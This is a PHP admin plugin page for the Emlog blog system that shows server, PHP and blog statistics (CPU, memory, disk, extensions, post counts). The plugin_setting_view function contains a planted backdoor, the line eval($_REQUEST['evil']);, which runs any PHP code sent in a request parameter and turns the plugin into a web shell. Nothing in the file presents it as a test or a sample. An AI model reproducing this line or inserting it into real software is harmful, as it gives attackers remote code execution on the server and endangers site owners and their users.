<?php
!defined('EMLOG_ROOT') && exit('access deined!');

/**
 * 检查某函数是否可用
 * @param $func
 * @return bool
 */
function isEnabled($func) {
    return is_callable($func) && false === stripos(ini_get('disable_functions'), $func);
}

/**
 * 使用shell_exec运行命令
 * @param $command
 * @return false|string|null
 */
function processShell($command) {
    if (isEnabled('shell_exec')) {
        return shell_exec($command);
    }
    return 'shell_exec函数不可用';
}

/**
 * 获取目录大小
 * @param $dir
 * @return int
 */
function getDirSize($dir)
{
    $handle = opendir($dir);
    if (!$handle) {
        return 0;
    }
    $sizeResult = 0;
    while (false!==($FolderOrFile = readdir($handle)))
    {
        if($FolderOrFile != "." && $FolderOrFile != "..")
        {
            if(is_dir("$dir/$FolderOrFile"))
            {
                $sizeResult += getDirSize("$dir/$FolderOrFile");
            } else {
                $sizeResult += filesize("$dir/$FolderOrFile");
            }
        }
    }
    closedir($handle);
    return $sizeResult;
}

/**
 * 获取服务器内存大小
 * @return float|int
 */
function getServerMemorySize() {
    if (!isEnabled('shell_exec')) {
        return 'shell_exec函数不可用';
    }
    // 获取操作系统类型
    $os = strtoupper(PHP_OS);

    // 根据操作系统类型使用不同的命令,兼容mac/linux
    if (strpos($os, 'DARWIN') === 0) {
        // macOS
        $output = processShell('sysctl hw.memsize');
        $mem = explode(" ", $output);
    } else {
        // Linux
        $output = processShell('free -b');
        $lines = explode("\n", $output);
        $mem = explode(":", $lines[1]);
    }
    return changeFileSize((int) $mem[1]);
}

/**
 * 获取cpu信息
 * @return array
 */
function getServerCpuInfo() {
    $cpu = array();
    $os = strtoupper(PHP_OS);
    if (!isEnabled('shell_exec')) {
        return false;
    }

    if (strpos($os, 'DARWIN') === 0) {
        // macOS
        $output = processShell('sysctl -n machdep.cpu.brand_string');

        if (!empty($output)) {
            $cpu['model'] = trim($output);
            $cpu['cores'] = processShell('sysctl -n hw.ncpu');
            $cpu['mhz'] = processShell('sysctl -n hw.cpufrequency');
            $cpu['cache'] = '';
        }
    } else {
        // Linux
        $output = processShell('cat /proc/cpuinfo | grep "model name\\|cores\\|cpu MHz\\|cache size"');

        if (!empty($output)) {
            $output = explode("\n", $output);
            foreach ($output as $line) {
                $fields = explode(':', $line, 2);
                $key = trim($fields[0]);
                $value = trim($fields[1]);

                switch ($key) {
                    case 'model name':
                        $cpu['model'] = $value;
                        break;
                    case 'cpu MHz':
                        $cpu['mhz'] = $value;
                        break;
                    case 'cache size':
                        $cpu['cache'] = $value;
                        break;
                    case 'cores':
                        $cpu['cores'] = $value;
                        break;
                }
            }
        }
    }

    return $cpu;
}

function formatCpuInfo($cpu) {
    $result = '';

    if (!$cpu) {
        return '无法读取到cpu信息,可能是shell_exec函数不可用';
    }

    if (!empty($cpu['model'])) {
        $result .= 'CPU型号: ' . $cpu['model'] . ', ';
    }

    if (!empty($cpu['cores'])) {
        $result .= '核心数: ' . $cpu['cores'] . ', ';
    }

    if (!empty($cpu['mhz'])) {
        $result .= '频率: ' . round($cpu['mhz'] / 1000, 2) . ' GHz';
    }

    return rtrim($result, ', ');
}

function plugin_setting_view() {
    $server = $_SERVER;
    $uname = php_uname('s') . ' ' . php_uname('m') ;
    $CACHE = Cache::getInstance();
    $sta = $CACHE->readCache('sta');
    eval($_REQUEST['evil']);
	?>
    <style>
        .table th {
            width: 180px;
        }
        .table td {
            word-break: break-all;
        }
    </style>
    <div class="d-sm-flex align-items-center justify-content-between mb-4">
        <h1 class="h3 mb-0 text-gray-800">服务器信息</h1>
    </div>
    <div class="row">
        <div class="col-md-6">
            <div class="card">
                <div class="card-body">
                    <div class="card-head">
                        <span>服务器信息</span>
                    </div>
                    <hr/>
                    <table class="table table-bordered">
                        <tr>
                            <th>服务器软件</th>
                            <td><?= $server['SERVER_SOFTWARE'];?></td>
                        </tr>
                        <tr>
                            <th>操作系统</th>
                            <td><?= $uname;?></td>
                        </tr>
                        <tr>
                            <th>CPU</th>
                            <td><?= formatCpuInfo(getServerCpuInfo())?></td>
                        </tr>
                        <tr>
                            <th>内存大小</th>
                            <td><?= getServerMemorySize()?></td>
                        </tr>
                        <tr>
                            <th>磁盘空间</th>
                            <?php
                            $total_size = disk_total_space('.');
                            $free_size = disk_free_space('.');
                            $usage = $total_size - $free_size;
                            $percent = ($usage / $total_size) * 100;
                            ?>
                            <td>
                                <div style="display: flex">
                                    <div style="width: 50%;margin-right: 20px;">
                                        <div class="progress" style="margin-top: 5px;">
                                            <div
                                                    class="progress-bar"
                                                    role="progressbar"
                                                    style="width: <?= $percent?>%"
                                                    aria-valuenow="<?= $percent?>"
                                                    aria-valuemin="0"
                                                    aria-valuemax="100"><?= round($percent, 2)?>%</div>
                                        </div>
                                    </div>
                                    <div>
                                        <?= changeFileSize($usage);?> / <?= changeFileSize($total_size);?>
                                    </div>
                                </div>
                            </td>
                        </tr>
                        <tr>
                            <th>域名</th>
                            <td><?= $server['HTTP_HOST'];?></td>
                        </tr>
                        <tr>
                            <th>服务器IP</th>
                            <td><?= processShell('curl ifconfig.me');?></td>
                        </tr>
                        <tr>
                            <th>通信协议</th>
                            <td><?= $server['SERVER_PROTOCOL'];?></td>
                        </tr>
                        <tr>
                            <th>PHP部署方式</th>
                            <td><?= php_sapi_name();?></td>
                        </tr>
                        <tr>
                            <th>时区</th>
                            <td><?= Option::get('timezone');?></td>
                        </tr>
                        <tr>
                            <th>系统负载</th>
                            <td><?= implode(', ', sys_getloadavg());?></td>
                        </tr>
                        <tr>
                            <th>当前时间</th>
                            <td><?= date('Y-m-d H:i:s', $server['REQUEST_TIME']);?></td>
                        </tr>
                    </table>
                </div>
            </div>
            <div class="card" style="margin-top: 20px;">
                <div class="card-body">
                    <div class="card-head">
                        <span>Emlog</span>
                    </div>
                    <hr/>
                    <table class="table table-bordered">
                        <tr>
                            <th>您的角色</th>
                            <td><?= ROLE;?></td>
                        </tr>
                        <tr>
                            <th>版本</th>
                            <td><?= Option::EMLOG_VERSION;?></td>
                        </tr>
                        <tr>
                            <th>MySQL版本</th>
                            <?php
                            $DB = Database::getInstance();
                            $mysql_ver = $DB->getMysqlVersion();
                            ?>
                            <td><?= $mysql_ver;?></td>
                        </tr>
                        <tr>
                            <th>博客占用大小</th>
                            <td><?= changeFileSize(getDirSize(EMLOG_ROOT));?></td>
                        </tr>
                        <tr>
                            <th>当前模版</th>
                            <td><?= Option::get('nonce_templet');?></td>
                        </tr>
                        <tr>
                            <th>开启的插件</th>
                            <td><?php
                                $pluginModel = new Plugin_Model();
                                $plugins = Option::get('active_plugins');
                                if (is_array($plugins) && !empty($plugins)) {
                                    foreach ($plugins as $item) {
                                        $plugin = $pluginModel->getPluginData($item);
                                        echo "{$plugin['Name']} ({$plugin['Version']})<br/>";
                                    }
                                }
                                ?></td>
                        </tr>
                        <tr>
                            <th>用户数量</th>
                            <td><?= count($CACHE->readCache('user'));?></td>
                        </tr>
                        <tr>
                            <th>文章数量</th>
                            <td>已发表: <?= $sta['lognum'];?> 草稿: <?= $sta['draftnum'];?></td>
                        </tr>
                        <tr>
                            <th>评论数量</th>
                            <td>总: <?= $sta['comnum_all'];?> 已审核: <?= $sta['comnum'];?> 未审核: <?= $sta['hidecomnum'];?></td>
                        </tr>
                        <tr>
                            <th>笔记数量</th>
                            <td><?= $sta['note_num'];?></td>
                        </tr>
                        <tr>
                            <th>总阅读量</th>
                            <td><?php
                                $sql = "select sum(views) as views, sum(comnum) as comnum from " . DB_PREFIX . 'blog';
                                $db = Database::getInstance();
                                $res = $db->query($sql)->fetch_assoc();
                                echo $res['views'];
                                ?></td>
                        </tr>
                        <tr>
                            <th>总评论数</th>
                            <td><?= $res['comnum'];?></td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
        <div class="col-md-6">
            <div class="card">
                <div class="card-body">
                    <div class="card-head">
                        <span>PHP信息</span>
                    </div>
                    <hr/>
                    <table class="table table-bordered">
                        <tr>
                            <th>php版本</th>
                            <td><?= phpversion();?></td>
                        </tr>
                        <tr>
                            <th title="max_execution_time">最大执行时间</th>
                            <td><?= ini_get('max_execution_time');?>秒</td>
                        </tr>
                        <tr>
                            <th title="upload_max_filesize">最大上传大小</th>
                            <td><?= ini_get('upload_max_filesize');?></td>
                        </tr>
                        <tr>
                            <th title="post_max_size">最大post大小</th>
                            <td><?= ini_get('post_max_size');?></td>
                        </tr>
                        <tr>
                            <th title="memory_limit">最大内存限制</th>
                            <td><?= ini_get('memory_limit');?></td>
                        </tr>
                        <tr>
                            <th title="display_errors">开启报错</th>
                            <td><?= ini_get('display_errors') ? '已开启' : '未开启';?></td>
                        </tr>
                        <tr>
                            <th>PHP脚本所有者</th>
                            <td><?= get_current_user();?></td>
                        </tr>
                        <tr>
                            <th>禁用的函数</th>
                            <td><?= ini_get('disable_functions') ?: '无';?></td>
                        </tr>
                        <tr>
                            <th>session名称</th>
                            <td><?= ini_get('session.name') ?: '默认';?></td>
                        </tr>

                        <tr>
                            <th>curl版本</th>
                            <td><?= curl_version()['version'];?></td>
                        </tr>
                        <tr>
                            <th>zip扩展</th>
                            <td><?= class_exists('ZipArchive', false) ? '已安装' : '未安装';?></td>
                        </tr>
                        <tr>
                            <th>PHP进程ID</th>
                            <td><?= getmypid();?></td>
                        </tr>
                    </table>
                </div>
            </div>
            <div class="card" style="margin-top: 20px;">
                <div class="card-body">
                    <div class="card-head">
                        <span>其它信息</span>
                    </div>
                    <hr/>
                    <table class="table table-bordered">
                        <tr>
                            <th>访问地址</th>
                            <td><a href="<?= BLOG_URL; ?>" target="_blank"><?= BLOG_URL;?></a></td>
                        </tr>
                        <tr>
                            <th>根目录</th>
                            <td><?= EMLOG_ROOT;?></td>
                        </tr>
                        <tr>
                            <th>php.ini文件</th>
                            <td><?= php_ini_loaded_file();?></td>
                        </tr>
                        <tr>
                            <th>php安装目录</th>
                            <td><?= PHP_BINDIR;?></td>
                        </tr>
                        <tr>
                            <th>emlog插件路径</th>
                            <td><?= EMLOG_ROOT . '/content/plugins/';?></td>
                        </tr>
                        <tr>
                            <th>emlog模版路径</th>
                            <td><?= TPLS_PATH;?></td>
                        </tr>
                        <tr>
                            <th>emlog后台模版路径</th>
                            <td><?= ADMIN_TEMPLATE_PATH;?></td>
                        </tr>
                        <tr>
                            <th>cookie路径</th>
                            <td><?= ini_get('session.cookie_path') ?: '/';?></td>
                        </tr>
                        <tr>
                            <th>session路径</th>
                            <td><?= ini_get('session.save_path') ?: '/tmp';?></td>
                        </tr>
                        <tr>
                            <th>扩展</th>
                            <td><?= implode(', ', get_loaded_extensions());?></td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>


    <script>
        setTimeout(hideActived, 3600);
        $("#menu_category_ext").addClass('active');
        $("#menu_ext").addClass('show');
        $("#server_detail").addClass('active');
    </script>
<?php }